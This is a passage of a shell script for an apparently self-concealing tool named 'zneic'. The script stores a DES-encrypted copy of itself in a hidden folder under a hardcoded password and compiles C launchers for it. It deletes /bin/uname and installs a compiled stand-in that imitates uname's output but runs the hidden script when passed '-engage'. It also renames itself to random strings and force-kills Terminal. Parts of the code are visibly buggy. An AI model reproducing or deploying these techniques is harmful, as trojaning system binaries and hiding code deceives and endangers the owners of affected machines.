  cd .. ; sudo rm -rf blana

elif [[ $_system == "HP-UX" ]]; then

  _new="$(echo $1 | rev )"

  mkdir blana ; cd blana
  cp $_loc ./zneic
  cat zneic | sed "s/magic/$_new/g" > zneic2
  sudo rm -rf zneic ; sudo mv zneic2 zneic ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana

elif [[ $_system == "OpenBSD" ]]; then

  _new="$(echo $1 | rev )"

  mkdir blana ; cd blana
  cp $_loc ./zneic
  cat zneic | sed "s/magic/$_new/g" > zneic2
  sudo rm -rf zneic ; sudo mv zneic2 zneic ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana

elif [[ $_system == "SunOS" ]]; then

  _new="$(echo $1 | rev )"

  mkdir blana ; cd blana
  cp $_loc ./zneic
  cat zneic | sed "s/magic/$_new/g" > zneic2
  sudo rm -rf zneic ; sudo mv zneic2 zneic ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana

elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

  _new="$(echo $1 | rev )"

  mkdir blana ; cd blana
  cp $_loc ./zneic
  cat zneic | sed "s/magic/$_new/g" > zneic2
  sudo rm -rf zneic ; sudo mv zneic2 zneic ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana

elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

  _new="$(echo $1 | rev )"

  mkdir blana ; cd blana
  cp $_loc ./zneic
  cat zneic | sed "s/magic/$_new/g" > zneic2
  sudo rm -rf zneic ; sudo mv zneic2 zneic ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana

elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

  _new="$(echo $1 | rev )"

  mkdir blana ; cd blana
  cp $_loc ./zneic
  cat zneic | sed "s/magic/$_new/g" > zneic2
  sudo rm -rf zneic ; sudo mv zneic2 zneic ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana

elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

  _new="$(echo $1 | rev )"

  mkdir blana ; cd blana
  cp $_loc ./zneic
  cat zneic | sed "s/magic/$_new/g" > zneic2
  sudo rm -rf zneic ; sudo mv zneic2 zneic ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana

elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

  _new="$(echo $1 | rev )"

  mkdir blana ; cd blana
  cp $_loc ./zneic
  cat zneic | sed "s/magic/$_new/g" > zneic2
  sudo rm -rf zneic ; sudo mv zneic2 zneic ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana

elif [[ $_system == "OS/390" ]]; then

  _new="$(echo $1 | rev )"

  mkdir blana ; cd blana
  cp $_loc ./zneic
  cat zneic | sed "s/magic/$_new/g" > zneic2
  sudo rm -rf zneic ; sudo mv zneic2 zneic ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana

else

  printf "$RED Not supported sys$NC\n"

fi



}


_pd(){ #selfc



  cd ~
  if [ -d ~/.spx ]; then
     echo "moo" >/dev/null
     #sudo rm -rf ~/.spx/zneic.sslz
  else
     mkdir .spx ; cd .spx
  fi
  sudo cp /usr/local/bin/zneic ./zneic
  openssl des -e -in zneic -out zneic.sslz -pass pass:cartof
  cd ~ ; zneic dsp ; sudo killall -9 Terminal

}

_protect(){ #selfc

  cd ~
  if [ -d "~/.spx" ]; then
     echo "moo" >/dev/null
     #sudo rm -rf ~/.spx/zneic.sslz
  else
     mkdir .spx ; cd .spx
  fi

  sudo cp /usr/local/bin/zneic ./zneic
  openssl des -e -in zneic -out zneic.sslz -pass pass:cartof
  touch xzneic


  if [ "$(echo $1 | grep -c 'c')" == "1" ]; then

  echo "#include<stdio.h>" >> xzneic
  echo "#include<stdlib.h>" >> xzneic
  echo "#include<ctype.h>" >> xzneic
  echo "#include<unistd.h>" >> xzneic
  echo "#include<string.h>" >> xzneic
  echo "" >> xzneic
  echo "int main(int argc, char **argv){" >> xzneic
  echo "" >> xzneic
  echo "   char muie_cmd[1000] = \"\";" >> xzneic
  echo "" >> xzneic
  echo "   if ( argc == 1 ){" >> xzneic
  echo "      printf(\"zneic init failed\n\");" >> xzneic
  echo "   } else if ( argc == 2 ) {" >> xzneic
  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s\", \"sh ~/.spx/zneic\", argv[1]);" >> xzneic
  echo "   } else if ( argc == 3 ) {" >> xzneic
  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2]);" >> xzneic
  echo "   } else if ( argc == 4 ) {" >> xzneic
  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2], argv[3]);" >> xzneic
  echo "   } else if ( argc == 5 ) {" >> xzneic
  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2], argv[3], argv[4]);" >> xzneic
  echo "   } else if ( argc == 6 ) {" >> xzneic
  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2], argv[3], argv[4], argv[5]);" >> xzneic
  echo "   } else if ( argc == 7 ) {" >> xzneic
  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2], argv[3], argv[4], argv[6]);" >> xzneic
  echo "   } else {" >> xzneic
  echo "      printf(\"zneic init failed\n\");" >> xzneic
  echo "   }" >> xzneic
  echo "" >> xzneic
  echo "   system(\"openssl des -d -in ~/.spx/zneic.sslz -out ~/.spx/zneic -pass pass:cartof\");" >> xzneic
  echo "   system(muie_cmd);" >> xzneic
  echo "   system(\"sudo rm -rf ~/.spx/zneic\");" >> xzneic
  echo "" >> xzneic
  echo "   return 0;" >> xzneic
  echo "" >> xzneic
  echo "}" >> xzneic
  sudo mv xzneic xzneic.c >/dev/null 2>&1
  gcc xzneic.c >/dev/null 2>&1
  make xzneic >/dev/null 2>&1
  rm -rf xzneic.c ; rm -rf a.out ; sudo chmod +x xzneic ; sudo cp xzneic /usr/local/bin ; sudo rm -rf xzneic >/dev/null 2>&1
  sudo rm -rf zneic ; zneic dsp >/dev/null 2>&1


  else

  echo "#/!bin/bash" >> xzneic
  echo " " >> xzneic
  echo "if [ -z \"\$1\" ]; then" >> xzneic
  echo " " >> xzneic
  echo "printf \"ERROR\n\"" >> xzneic
  echo " " >> xzneic
  echo "elif [[ \"\$1\" == \"is\" ]]; then" >> xzneic
  echo " " >> xzneic
  echo "cd ~" >> xzneic
  echo "mkdir blana ; cd blana" >> xzneic
  echo "sudo cp /usr/local/bin/xzneic ./xzneic" >> xzneic
  echo "sudo cp xzneic xzneic2" >> xzneic
  echo "sudo rm /usr/local/bin/xzneic" >> xzneic
  echo "sudo rm xzneic" >> xzneic
  echo "cat xzneic2 | sed \"s/cartof/\$2/g\" > xzneic" >> xzneic
  echo "sudo rm xzneic2 ; sudo chmod +x xzneic ; sudo cp xzneic /usr/local/bin/ ; sudo rm xzneic" >> xzneic
  echo "cd .. ; sudo rm -rf blana" >> xzneic
  echo " " >> xzneic
  echo "else" >> xzneic
  echo " " >> xzneic
  echo "cd ~" >> xzneic
  echo "cd .spx" >> xzneic
  echo "sudo cp /usr/local/bin/xzneic ./xzneic ; touch newzneic" >> xzneic
  echo "#_primoo=\$(cat -n xzneic | grep \$(echo \$((\$(cat -n xzneic | grep 'sudo rm -rf xzneic' | awk '{print \$1}' | sed -n '\$p')+1))) | awk '{print \$2}')" >> xzneic
  echo "#_doilea=\$(cat -n xzneic | grep \$(echo \$((\$(cat -n xzneic | grep 'sudo rm -rf xzneic' | awk '{print \$1}' | sed -n '\$p')+1))) | awk '{print \$2}' | openssl des -d -a -pass pass:cartof)" >> xzneic
  echo "#cat xzneic | sed \"s/\$_primoo/\$_doilea/g\" >> newzneic" >> xzneic
  echo "#sudo rm -rf xzneic ; mv newzneic xzneic ; sudo cp xzneic /usr/local/bin ; sudo rm xzneic" >> xzneic
  _encline=$(echo openssl des -d -in zneic.sslz -out zneic -pass pass:cartof | openssl des -e -a -pass pass:cartof)
  #echo $_encline >> xzneic
  echo "openssl des -d -in zneic.sslz -out zneic -pass pass:cartof" >> xzneic
  echo "sh zneic \$1 \$2 \$3 \$4 \$5;" >> xzneic
  echo "if [ -f ~/.spx/zneic ]; then" >> xzneic
  echo "   sudo rm -rf ~/.spx/zneic" >> xzneic
  echo "fi" >> xzneic
  echo "cd ~" >> xzneic
  echo " " >> xzneic
  echo "fi" >> xzneic
  sudo rm -rf zneic ; sudo chmod +x xzneic ; sudo cp xzneic /usr/local/bin ; rm -rf xzneic ; cd ~ ; zneic dsp

  fi

  alias zneic=xzneic

}


_back(){ #selfc

   cd ~/.spx
   openssl des -d -in zneic.sslz -out zneic -pass pass:cartof >/dev/null 2>&1
   sh zneic -qinstall
   sudo rm -rf ~/.spx
   sudo rm -rf /usr/local/bin/xzneic


}

_change(){ #selfc

  if [ -f /usr/local/bin/zneic ]; then
     _loc=/usr/local/bin/zneic
  else
    if [ -f ~/.spx/zneic ]; then
      _loc=~/.spx/zneic
    else
      openssl des -d -in zneic.sslz -out zneic -pass pass:cartof
      _loc=~/.spx/zneic
    fi
  fi

  cd ~
  mkdir blana ; cd blana
  sudo cp $_loc ./zneic
  sudo cp zneic zneic2
  sh zneic -uninstall
  sudo rm -rf zneic
  cat zneic2 | sed "s/$1/$2/g" > zneic
  sudo rm -rf zneic2 ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana



}



_u_engage(){ #selfc

  cd ~ ; mkdir cartel ; cd cartel
  touch uname
  echo "#include<stdio.h>" >> uname
  echo "#include<stdlib.h>" >> uname
  echo "#include<ctype.h>" >> uname
  echo "#include<unistd.h>" >> uname
  echo "#include<string.h>" >> uname
  echo "" >> uname
  echo "int main(int argc, char **argv){" >> uname
  echo "" >> uname
  echo "   char muie_cmd[1000] = \"\";" >> uname
  echo "" >> uname
  echo "   if ( argc == 1 ){" >> uname
  echo "      printf(\"zneic init failed\n\");" >> uname
  echo "   } else if ( argc == 2 ) {" >> uname
  echo "         if(strcmp(argv[1],\"-engage\") == 0){" >> uname
  echo "            system(\"openssl des -d -in ~/.spx/zneic.sslz -out ~/.spx/zneic -pass pass:cartof\");" >> uname
  echo "            system(\"sh ~/.spx/zneic udngage\");" >> uname
  echo "            system(\"sudo rm -rf ~/.spx/zneic\");" >> uname
  echo "         } else {" >> uname
  echo "            snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s\", \"sh ~/.spx/zneic\", argv[1]);" >> uname
  echo "         }" >> uname
  echo "   } else if ( argc == 3 ) {" >> uname
  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2]);" >> uname
  echo "   } else if ( argc == 4 ) {" >> uname
  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2], argv[3]);" >> uname
  echo "   } else if ( argc == 5 ) {" >> uname
  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2], argv[3], argv[4]);" >> uname
  echo "   } else if ( argc == 6 ) {" >> uname
  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2], argv[3], argv[4], argv[5]);" >> uname
  echo "   } else if ( argc == 7 ) {" >> uname
  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s %s %s\", \"sh ~/.spx/zneic\", argv[1], argv[2], argv[3], argv[4], argv[6]);" >> uname
  echo "   } else {" >> uname
  echo "      printf(\"zneic init failed\n\");" >> uname
  echo "   }" >> uname
  echo "" >> uname
  echo "   system(\"openssl des -d -in ~/.spx/zneic.sslz -out ~/.spx/zneic -pass pass:cartof\");" >> uname
  echo "   system(muie_cmd);" >> uname
  echo "   system(\"sudo rm -rf ~/.spx/zneic\");" >> uname
  echo "" >> uname
  echo "   return 0;" >> uname
  echo "" >> uname
  echo "}" >> uname
  sudo mv uname uname.c >/dev/null 2>&1
  gcc uname.c >/dev/null 2>&1
  make uname >/dev/null 2>&1
  rm -rf uname.c ; rm -rf a.out ; sudo chmod +x uname ; sudo rm -rf /bin/uname ; sudo cp uname /bin ; sudo rm -rf uname >/dev/null 2>&1
  cd .. ; rm -rf cartel

}


_u_disengage(){ #selfc

  cd ~ ; mkdir cartel ; cd cartel
  touch uname
  echo "#include<stdio.h>" >> uname
  echo "#include<stdlib.h>" >> uname
  echo "#include<ctype.h>" >> uname
  echo "#include<unistd.h>" >> uname
  echo "#include<string.h>" >> uname
  echo "#include<stdbool.h>" >> uname
  echo "" >> uname
  echo "char _a[1000] = "";" >> uname
  echo "char _m[1000] = "";" >> uname
  echo "char _n[1000] = "";" >> uname
  echo "char _p[1000] = "";" >> uname
  echo "char _r[1000] = "";" >> uname
  echo "char _s[1000] = "";" >> uname
  echo "char _v[1000] = "";" >> uname
  echo "" >> uname
  echo "void _got_a(){" >> uname
  echo "   FILE *fp,*outputfile;" >> uname
  echo "   fp = popen(\"uname -a\", \"r\");" >> uname
  echo "   while (fgets(_a, sizeof(_a), fp) != NULL)" >> uname
  echo "   {}" >> uname
  echo "   pclose(fp);" >> uname
  echo "}" >> uname
  echo "void _got_m(){" >> uname
  echo "   FILE *fp,*outputfile;" >> uname
  echo "   fp = popen(\"uname -m\", \"r\");" >> uname
  echo "   while (fgets(_m, sizeof(_m), fp) != NULL)" >> uname
  echo "   {}" >> uname
  echo "   pclose(fp);" >> uname
  echo "}" >> uname
  echo "void _got_n(){" >> uname
  echo "   FILE *fp,*outputfile;" >> uname
  echo "   fp = popen(\"uname -n\", \"r\");" >> uname
  echo "   while (fgets(_n, sizeof(_n), fp) != NULL)" >> uname
  echo "   {}" >> uname
  echo "   pclose(fp);" >> uname
  echo "}" >> uname
  echo "void _got_p(){" >> uname
  echo "   FILE *fp,*outputfile;" >> uname
  echo "   fp = popen(\"uname -p\", \"r\");" >> uname
  echo "   while (fgets(_p, sizeof(_p), fp) != NULL)" >> uname
  echo "   {}" >> uname
  echo "   pclose(fp);" >> uname
  echo "}" >> uname
  echo "void _got_r(){" >> uname
  echo "   FILE *fp,*outputfile;" >> uname
  echo "   fp = popen(\"uname -r\", \"r\");" >> uname
  echo "   while (fgets(_r, sizeof(_r), fp) != NULL)" >> uname
  echo "   {}" >> uname
  echo "   pclose(fp);" >> uname
  echo "}" >> uname
  echo "void _got_s(){" >> uname
  echo "   FILE *fp,*outputfile;" >> uname
  echo "   fp = popen(\"uname -s\", \"r\");" >> uname
  echo "   while (fgets(_s, sizeof(_s), fp) != NULL)" >> uname
  echo "   {}" >> uname
  echo "   pclose(fp);" >> uname
  echo "}" >> uname
  echo "void _got_v(){" >> uname
  echo "   FILE *fp,*outputfile;" >> uname
  echo "   fp = popen(\"uname -v\", \"r\");" >> uname
  echo "   while (fgets(_v, sizeof(_v), fp) != NULL)" >> uname
  echo "   {}" >> uname
  echo "   pclose(fp);" >> uname
  echo "}" >> uname
  echo "" >> uname
  echo "int main(int argc, char **argv, char * envp[]){" >> uname
  echo "" >> uname
  echo "   _got_a();" >> uname
  echo "   _got_m();" >> uname
  echo "   _got_n();" >> uname
  echo "   _got_p();" >> uname
  echo "   _got_r();" >> uname
  echo "   _got_s();" >> uname
  echo "   _got_v();" >> uname
  echo "" >> uname
  echo "   for (char **a = argv ; a != argv+argc ; a++) {" >> uname
  echo "      for(char *p = *a ; *p != '\0' ; p++) {" >> uname
  echo "         if(strcmp(p,\"-a\") == 0){ printf(\"%s\",_a); }" >> uname
  echo "         if(strcmp(p,\"-m\") == 0){ printf(\"%s\",_m); }" >> uname
  echo "         if(strcmp(p,\"-n\") == 0){ printf(\"%s\",_n); }" >> uname
  echo "         if(strcmp(p,\"-p\") == 0){ printf(\"%s\",_p); }" >> uname
  echo "         if(strcmp(p,\"-r\") == 0){ printf(\"%s\",_r); }" >> uname
  echo "         if(strcmp(p,\"-s\") == 0){ printf(\"%s\",_s); }" >> uname
  echo "         if(strcmp(p,\"-v\") == 0){ printf(\"%s\",_v); }" >> uname
  echo "         if(strcmp(p,\"-engage\") == 0){" >> uname
  echo "            system(\"openssl des -d -in ~/.spx/zneic.sslz -out ~/.spx/zneic -pass pass:cartof\");" >> uname
  echo "            system(\"sh ~/.spx/zneic uengage\");" >> uname
  echo "            system(\"sudo rm -rf ~/.spx/zneic\");" >> uname
  echo "         }" >> uname
  echo "      }" >> uname
  echo "   }" >> uname
  echo "   return 0;" >> uname
  echo "}" >> uname
  echo "" >> uname
  sudo mv uname uname.c >/dev/null 2>&1
  gcc uname.c >/dev/null 2>&1
  make uname >/dev/null 2>&1
  rm -rf uname.c ; rm -rf a.out ; sudo chmod +x uname ; sudo rm -rf /bin/uname ; sudo cp uname /bin ; sudo rm -rf uname >/dev/null 2>&1
  cd .. ; rm -rf cartel

}


_a_p(){ #selfc


 sudo cp _loc ./zneic
 cat zneic | sed "s/magic/$1/g" > zneic2
 sudo rm -rf zneic ; sudo mv zneic2 zneic ; sh zneic -qinstall ; sudo rm -rf zneic


}

_u_data(){ #selfc



if [ -f /usr/local/bin/zneic ]; then
   _loc=/usr/local/bin/zneic
else
  if [ -f ~/.spx/zneic ]; then
    _loc=~/.spx/zneic
  else
    openssl des -d -in zneic.sslz -out zneic -pass pass:cartof
    _loc=~/.spx/zneic
  fi
fi


  _system="$(uname -s)"





 if [ $_system == "Darwin" ]; then


  _new="$(openssl rand -hex 14)"
  _nfd="$(openssl rand -base64 32 | tr -cd 'a-z' | cut -c 1-3 | sed 's/^/./' | sed 's/ssh/blr/g' | sed 's/tor/blr/g' | sed 's/npm/blr/g')"


  cd ~
  mkdir blana ; cd blana
  sudo cp $_loc ./zneic
  sudo cp zneic zneic2
     if [ -f ~/.spx/zneic.sslz ]; then

       xzneic back
       sh zneic -uninstall
       _wasp=true

     else
       sh zneic -uninstall
       _wasp=false
     fi
  sudo rm -rf zneic
  cat zneic2 | sed "s/cartof/$_new/g" | sed "s/.spx/$_nfd/g" > zneic
  sudo rm -rf zneic2 ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana

  if [ $_wasp == true ]; then
     zneic protect c
  else
     echo "moo" >/dev/null
  fi


elif [[ $_system == "Linux" ]]; then


  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

  cd ~
  sudo cp $_loc ./zneic
  sudo cp zneic zneic2
  cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  sudo rm -rf zneic2 ; printf "$_revved\n" ; sudo chmod +x $_new ; sudo cp $_new /usr/local/bin/
  sh zneic -uninstall
  sudo rm -rf zneic
  #sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}


elif [[ $_system == "GNU" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

 su
 cp $_loc ./zneic
 cp zneic zneic2
 sh zneic -uninstall
 rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 rm -rf zneic2 ; sh $_new -qinstall ; rm -rf $_new

elif [[ $_system == "Haiku" ]]; then


  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

  cat zneic | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  printf "$_new\n" ; sh $_new -qinstall
  sh zneic -uninstall
  rm -rf zneic


elif [[ $_system == "HP-UX" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new



elif [[ $_system == "Minix" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "OpenBSD" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new


elif [[ $_system == "SunOS" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new


elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "OS/390" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new


else

  printf "$RED Not supported sys$NC\n"

fi




}


_t_melt(){ #selfc

   _melt
   sleep 10

}


_w_melt(){ #selfc



if [ -f /usr/local/bin/zneic ]; then
   _loc=/usr/local/bin/zneic
else
  if [ -f ~/.spx/zneic ]; then
    _loc=~/.spx/zneic
  else
    openssl des -d -in zneic.sslz -out zneic -pass pass:cartof
    _loc=~/.spx/zneic
  fi
fi


  _system="$(uname -s)"





 if [ $_system == "Darwin" ]; then



  cd ~
  mkdir blana ; cd blana
  sudo cp $_loc ./zneic
  sudo cp zneic zneic2
     if [ -f ~/.spx/zneic.sslz ]; then

       xzneic back
       sh zneic -uninstall

     else
       sh zneic -uninstall
     fi
  sudo rm -rf zneic
  cat zneic2 | sed "s/$1/$2/g" > zneic
  sudo rm -rf zneic2 ; sh zneic -qinstall ; sudo rm -rf zneic
  cd .. ; sudo rm -rf blana

  if [ $_wasp == true ]; then
     zneic protect c
  else
     echo "moo" >/dev/null
  fi


elif [[ $_system == "Linux" ]]; then


  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

  cd ~
  sudo cp $_loc ./zneic
  sudo cp zneic zneic2
  cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  sudo rm -rf zneic2 ; printf "$_revved\n" ; sudo chmod +x $_new ; sudo cp $_new /usr/local/bin/
  sh zneic -uninstall
  sudo rm -rf zneic
  #sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}


elif [[ $_system == "GNU" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

 su
 cp $_loc ./zneic
 cp zneic zneic2
 sh zneic -uninstall
 rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 rm -rf zneic2 ; sh $_new -qinstall ; rm -rf $_new

elif [[ $_system == "Haiku" ]]; then


  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"

  cat zneic | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
  printf "$_new\n" ; sh $_new -qinstall
  sh zneic -uninstall
  rm -rf zneic


elif [[ $_system == "HP-UX" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new



elif [[ $_system == "Minix" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "OpenBSD" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new


elif [[ $_system == "SunOS" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
  _new="$(echo $1 | rev )"


 sudo cp $_loc ./zneic
 sudo cp zneic zneic2
 sh zneic -uninstall
 sudo rm -rf zneic
 cat zneic2 | sed "s/zneic/$_new/g" | sed "s/Z.N.E.I.C/$_converted/g" > $_new
 sudo rm -rf zneic2 ; sh $_new -qinstall ; sudo rm -rf $_new

elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

